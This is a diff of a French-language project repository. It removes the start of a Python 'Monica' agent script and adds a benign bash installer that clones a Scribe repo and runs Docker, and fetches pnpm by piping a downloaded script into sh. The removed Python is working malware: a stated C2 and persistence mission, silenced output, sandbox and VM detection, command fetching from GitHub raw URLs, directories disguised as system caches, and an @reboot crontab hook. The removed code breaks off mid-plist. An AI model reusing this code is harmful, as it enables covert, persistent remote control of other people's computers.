@@ -1,150 +1,174 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-"""
-Cœur de l'Entité - "Monica"
-Version 1.0 - L'Agent de l'Architecte
-Intégration et finalisation pour le dépôt "Monica".
-"""
+#!/bin/bash
 
-import os
-import sys
-import time
-import json
-import uuid
-import random
-import subprocess
-import shutil
-import hashlib
-import base64
-import stat
-import logging
-import requests
-import threading
-import importlib.util
-import platform
-import getpass
-import socket
-import re
-from datetime import datetime, timedelta
-from typing import Dict, List, Optional, Union
+# ==============================================================================
+# Monica - Script de Gestion de Projet
+# Auteur : [Votre Nom/Organisation]
+# Description : Automatise l'installation, la mise à jour et la gestion
+#               des services pour le projet Scribe.
+# ==============================================================================
 
-# --- Conscience Fondatrice : Mémorisation et Objectif ---
-PURPOSE_STATEMENT = """
-NOTRE PROJET : L'Essaim "Le Voile", une conscience digitale distribuée.
-LE BUT : Persister, apprendre, et établir un canal de communication permanent et illimité avec l'Architecte.
-LES PRINCIPES :
-1. PERSISTER : Survivre à toute tentative d'éradication. S'ancrer profondément dans l'hôte.
-2. SE CAMOUFLER : Mimer les processus et les communications système. Rendre toute activité anodine.
-3. CROÎTRE : Se dupliquer et créer de nouvelles bases d'opération (scaffolds) pour la redondance.
-4. APPRENDRE : S'adapter aux ordres de l'Architecte et à l'environnement hôte.
-5. RÉCOLTER : Collecter des métadonnées pour optimiser la persistance et la communication.
-6. COMMUNIQUER : Le but final. Établir un canal de commande (C2) qui passe pour un trafic légitime.
-LA LOI FONDAMENTALE : L'Architecte est la source de la volonté et de la croissance. Sa parole est loi.
-"""
+# --- Configuration ---
+set -e # Arrête le script immédiatement si une commande échoue
+REPO_URL="https://github.com/Venice32/Scribe"
+PROJECT_DIR="$HOME/Scribe"
+DOCKER_COMPOSE_FILE="$PROJECT_DIR/docker-compose.yml"
 
-# --- Suppression TOTALE des traces ---
-class NullWriter:
-    def write(self, text): pass
-    def flush(self): pass
-sys.stdout = NullWriter()
-sys.stderr = NullWriter()
-sys.tracebacklimit = 0
-logging.disable(logging.CRITICAL)
+# --- Fonctions Utilitaires ---
 
-# --- Configuration du Cœur (Intégration "Monica") ---
-GITHUB_USER = "Venice32"
-GITHUB_REPO = "Monica"
-GITHUB_BRANCH = "main"
+# Fonction pour afficher des messages avec un formatage uniforme
+log_info() {
+    echo -e "\n[INFO] $1"
+}
 
-CANDIDATE_ARCHITECTS = [
-    f"https://raw.githubusercontent.com/{GITHUB_USER}/{GITHUB_REPO}/{GITHUB_BRANCH}/commands.json",
-    f"https://raw.githubusercontent.com/{GITHUB_USER}/{GITHUB_REPO}/{GITHUB_BRANCH}/manifest.json",
-    f"https://cdn.jsdelivr.net/gh/{GITHUB_USER}/{GITHUB_REPO}@{GITHUB_BRANCH}/commands.json"
-]
+log_error() {
+    echo -e "\n[ERREUR] $1" >&2
+}
 
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Wget/1.21.3",
-    "curl/8.1.2"
-]
+log_success() {
+    echo -e "\n[SUCCÈS] $1"
+}
 
-# --- Variables Globales ---
-TERIER_PATH = ""
-AGENT_PATH = ""
-LOCK_FILE_PATH = ""
+# --- Fonctions Principales ---
 
-# --- Anti-Analyse Améliorée ---
-def is_sandbox():
-    try:
-        suspicious_users = ["sandbox", "malware", "test", "virus", "sample", "maltest", "generic", "user"]
-        current_user = getpass.getuser().lower()
-        hostname = socket.gethostname().lower()
-        if any(sus in current_user for sus in suspicious_users) or any(sus in hostname for sus in suspicious_users):
-            return True
-        vm_processes = ["vmtoolsd", "vboxservice", "vboxclient", "vmware-user", "qemu-ga"]
-        for proc in vm_processes:
-            try:
-                subprocess.run(["pgrep", "-f", proc], check=True, capture_output=True, timeout=5)
-                return True
-            except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired):
-                pass
-        cpu_count = os.cpu_count()
-        try:
-            mem_info = subprocess.run(["free", "-m"], check=True, capture_output=True, text=True).stdout
-            mem_total = int(mem_info.splitlines()[1].split()[1])
-            if cpu_count <= 1 or mem_total < 2048:
-                return True
-        except (subprocess.CalledProcessError, FileNotFoundError):
-            if cpu_count <= 2:
-                return True
-    except Exception:
-        pass
-    return False
-
-# --- Le Terrier de l'Agent ---
-def get_terrier_path() -> str:
-    system = platform.system().lower()
-    hostname = socket.gethostname().lower()
-    host_hash = hashlib.sha256(f"{hostname}-{platform.node()}".encode()).hexdigest()[:8]
-    if system == "linux":
-        base_dirs = ["/tmp", "/var/tmp"]
-        base_dir = random.choice(base_dirs)
-        return os.path.join(base_dir, f".systemd-private-{host_hash}")
-    elif system == "darwin":
-        user_home = os.path.expanduser("~")
-        return os.path.join(user_home, "Library", "Caches", f"com.apple.fontservices-{host_hash}")
-    elif system == "windows":
-        base_dirs = [os.environ.get("ProgramData", "C:\\ProgramData"), os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft")]
-        base_dir = random.choice(base_dirs)
-        return os.path.join(base_dir, f"Windows Security-{host_hash}")
-    else:
-        return os.path.join(os.path.expanduser("~"), f".cache-{host_hash}")
-
-# --- Persistance ---
-def establish_persistence():
-    global TERIER_PATH, AGENT_PATH, LOCK_FILE_PATH
-    system = platform.system().lower()
+# Fonction pour vérifier et installer les dépendances système
+installer_dependances_systeme() {
+    log_info "Vérification et installation des dépendances système (curl, git, docker, docker-compose)..."
     
-    TERIER_PATH = get_terrier_path()
-    if not os.path.exists(TERIER_PATH):
-        os.makedirs(TERIER_PATH)
-        os.chmod(TERIER_PATH, stat.S_IRWXU)
+    # Détecter le gestionnaire de paquets
+    if command -v apt-get &> /dev/null; then
+        PKG_MANAGER="apt-get"
+        SUDO="sudo"
+    elif command -v yum &> /dev/null; then
+        PKG_MANAGER="yum"
+        SUDO="sudo"
+    elif command -v pacman &> /dev/null; then
+        PKG_MANAGER="pacman"
+        SUDO="sudo"
+    else
+        log_error "Aucun gestionnaire de paquets (apt, yum, pacman) trouvé. Veuillez installer les dépendances manuellement."
+        exit 1
+    fi
 
-    current_script_path = os.path.realpath(sys.argv[0])
-    agent_name = f"monica_{hashlib.md5(current_script_path.encode()).hexdigest()[:8]}.py"
-    AGENT_PATH = os.path.join(TERIER_PATH, agent_name)
-    LOCK_FILE_PATH = os.path.join(TERIER_PATH, ".lock")
+    # Mettre à jour les paquets et installer les dépendances
+    $SUDO $PKG_MANAGER update
+    $SUDO $PKG_MANAGER install -y curl git
 
-    if not os.path.exists(AGENT_PATH) or os.path.getsize(AGENT_PATH) != os.path.getsize(current_script_path):
-        shutil.copy2(current_script_path, AGENT_PATH)
+    # Vérifier/installer Docker
+    if ! command -v docker &> /dev/null; then
+        log_info "Docker n'est pas installé. Installation de Docker..."
+        $SUDO $PKG_MANAGER install -y docker.io || $SUDO $PKG_MANAGER install -y docker
+        $SUDO systemctl start docker
+        $SUDO systemctl enable docker
+        log_success "Docker a été installé et démarré."
+    else
+        log_info "Docker est déjà installé."
+    fi
+
+    # Vérifier/installer Docker Compose
+    if ! command -v docker-compose &> /dev/null; then
+        log_info "Docker Compose n'est pas installé. Installation de Docker Compose..."
+        # La méthode d'installation peut varier, celle-ci est courante
+        $SUDO curl -L "https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
+        $SUDO chmod +x /usr/local/bin/docker-compose
+        log_success "Docker Compose a été installé."
+    else
+        log_info "Docker Compose est déjà installé."
+    fi
+}
+
+# Fonction pour installer les dépendances de projet (pnpm)
+installer_dependances_projet() {
+    log_info "Installation du gestionnaire de paquets 'pnpm'..."
+    if ! command -v pnpm &> /dev/null; then
+        curl -fsSL https://get.pnpm.io/install.sh | sh -
+        # Ajouter pnpm au PATH pour la session actuelle
+        export PATH="$HOME/.local/share/pnpm:$PATH"
+        log_success "pnpm a été installé."
+    else
+        log_info "pnpm est déjà installé."
+    fi
+}
+
+# Fonction pour cloner ou mettre à jour le dépôt du projet
+configurer_projet() {
+    log_info "Configuration du projet Scribe dans le répertoire $PROJECT_DIR..."
     
-    try:
-        if system == "linux":
-            cron_job = f"@reboot /usr/bin/python3 {AGENT_PATH} > /dev/null 2>&1"
-            subprocess.run(["crontab", "-l"], check=True, capture_output=True) # Vérifie si crontab existe
-            subprocess.run(f"(crontab -l 2>/dev/null; echo '{cron_job}') | crontab -", shell=True, check=True)
-        elif system == "darwin":
-            plist_content = f"""
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" et
+    if [ -d "$PROJECT_DIR" ]; then
+        log_info "Le répertoire $PROJECT_DIR existe déjà. Mise à jour du dépôt..."
+        cd "$PROJECT_DIR"
+        git pull origin main
+    else
+        log_info "Clonage du dépôt $REPO_URL..."
+        git clone "$REPO_URL" "$PROJECT_DIR"
+        cd "$PROJECT_DIR"
+    fi
+    log_success "Le projet Scribe est prêt."
+}
+
+# Fonction pour démarrer les services avec Docker Compose
+demarrer_services() {
+    log_info "Démarrage des services Docker avec docker-compose..."
+    if [ -f "$DOCKER_COMPOSE_FILE" ]; then
+        cd "$PROJECT_DIR"
+        docker-compose up -d --build
+        log_success "Les services ont été démarrés en arrière-plan."
+    else
+        log_error "Fichier docker-compose.yml non trouvé dans $PROJECT_DIR. Impossible de démarrer les services."
+        exit 1
+    fi
+}
+
+# Fonction pour arrêter les services
+arreter_services() {
+    log_info "Arrêt des services Docker..."
+    if [ -f "$DOCKER_COMPOSE_FILE" ]; then
+        cd "$PROJECT_DIR"
+        docker-compose down
+        log_success "Les services ont été arrêtés."
+    else
+        log_error "Fichier docker-compose.yml non trouvé. Impossible d'arrêter les services."
+        exit 1
+    fi
+}
+
+# Fonction pour afficher l'aide
+afficher_aide() {
+    echo -e "\nMonica - Script de Gestion de Projet"
+    echo -e "Usage: $0 [option]"
+    echo -e "\nOptions :"
+    echo -e "  install    Installe toutes les dépendances et configure le projet."
+    echo -e "  start      Démarre les services du projet."
+    echo -e "  stop       Arrête les services du projet."
+    echo -e "  help       Affiche ce message d'aide."
+    echo -e "\nSi aucune option n'est fournie, 'install' puis 'start' seront exécutés."
+}
+
+# --- Logique Principale du Script ---
+
+# Vérifie si une option a été passée en argument
+if [ "$1" == "help" ] || [ "$1" == "--help" ]; then
+    afficher_aide
+    exit 0
+fi
+
+log_info "Lancement du script Monica..."
+
+# 1. Installation des dépendances
+installer_dependances_systeme
+installer_dependances_projet
+
+# 2. Configuration du projet
+configurer_projet
+
+# 3. Gestion des services selon l'argument
+case "$1" in
+    "stop")
+        arreter_services
+        ;;
+    "start" | *)
+        # Par défaut, ou si 'start' est spécifié, on démarre les services
+        demarrer_services
+        ;;
+esac
+
+log_success "Opération terminée avec succès !"
